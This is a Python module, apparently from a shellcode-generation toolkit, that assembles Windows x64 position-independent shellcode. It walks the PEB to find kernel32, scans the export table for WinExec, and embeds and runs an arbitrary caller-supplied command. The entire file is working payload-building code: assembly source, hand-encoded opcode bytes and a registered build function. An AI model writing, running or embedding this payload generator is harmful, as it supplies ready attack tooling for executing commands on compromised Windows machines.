"""Windows x64 — WinExec(cmd, SW_SHOWNORMAL) via PEB walk + export table scan.

Technique:
  1. PEB walk (GS:[0x60] → Ldr → InMemoryOrderModuleList) to find kernel32.dll.
  2. Linear scan of export name table for "WinExec" (4-byte magic comparison).
  3. call/pop trick for position-independent command-string embedding.
  4. WinExec(cmd, 1); ret.

Assembly layout (three stitched segments):
  _PREAMBLE_SRC — register saves; assembled by keystone
  _GS_PEB_X64   — raw bytes for "mov rbx, [gs:0x60]"; keystone 0.9.2 cannot
                   encode gs-relative memory references on x64
  _BODY_SRC     — PEB traversal + export walk + call/pop stub; assembled by keystone
  cmd bytes     — appended raw; address pushed by "call cmd_exec" lands here
"""
from __future__ import annotations

from .._asm import assemble
from . import register

# keystone 0.9.2 silently returns None for any gs-relative memory access on x64.
# Encoding: GS prefix(0x65) + REX.W(0x48) + MOV r64,r/m64(0x8B) +
#            ModRM(0x1C = mod00,reg=rbx,rm=SIB) + SIB(0x25 = no-index,disp32) +
#            disp32(0x60,0,0,0)
_GS_PEB_X64 = bytes([0x65, 0x48, 0x8B, 0x1C, 0x25, 0x60, 0x00, 0x00, 0x00])

_PREAMBLE_SRC = """\
cld
push rbx
push r12
push r13
push r14
push r15
sub rsp, 0x28
"""

# PEB_LDR_DATA offsets (x64):
#   Ldr          = PEB + 0x18
#   InMemOrdList = Ldr + 0x20
# LDR_DATA_TABLE_ENTRY (from InMemoryOrderLinks ptr):
#   DllBase      = entry + 0x20
# PE64 export directory:
#   e_lfanew     = ImageBase + 0x3c
#   ExportDir    = NT_hdrs + 0x88
# IMAGE_EXPORT_DIRECTORY:
#   NumberOfNames         = +0x18
#   AddressOfFunctions    = +0x1c
#   AddressOfNames        = +0x20
#   AddressOfNameOrdinals = +0x24
_BODY_SRC = """\
mov rbx, [rbx + 0x18]
mov rbx, [rbx + 0x20]
mov rbx, [rbx]
mov rbx, [rbx]
mov r14, [rbx + 0x20]

mov eax, [r14 + 0x3c]
add rax, r14
mov eax, [rax + 0x88]
test eax, eax
jz done
add rax, r14
mov r15, rax

xor r13, r13
mov r13d, [r15 + 0x18]

search:
dec r13d
js done
mov eax, [r15 + 0x20]
add rax, r14
mov eax, [rax + r13 * 4]
add rax, r14
cmp dword ptr [rax], 0x456e6957
jne search
cmp dword ptr [rax + 4], 0x00636578
jne search

mov eax, [r15 + 0x24]
add rax, r14
movzx eax, word ptr [rax + r13 * 2]
mov r12d, [r15 + 0x1c]
add r12, r14
mov eax, [r12 + rax * 4]
add rax, r14
mov r12, rax

jmp get_str

cmd_exec:
pop rcx
mov edx, 1
call r12

done:
add rsp, 0x28
pop r15
pop r14
pop r13
pop r12
pop rbx
ret

get_str:
call cmd_exec
"""


@register("windows", "x64")
def build(cmd: str) -> bytes:
    """Assemble Windows x64 WinExec shellcode for the given command string."""
    preamble = assemble(_PREAMBLE_SRC, arch="x86", mode="64")
    body = assemble(_BODY_SRC, arch="x86", mode="64")
    return preamble + _GS_PEB_X64 + body + cmd.encode("latin-1") + b"\x00"
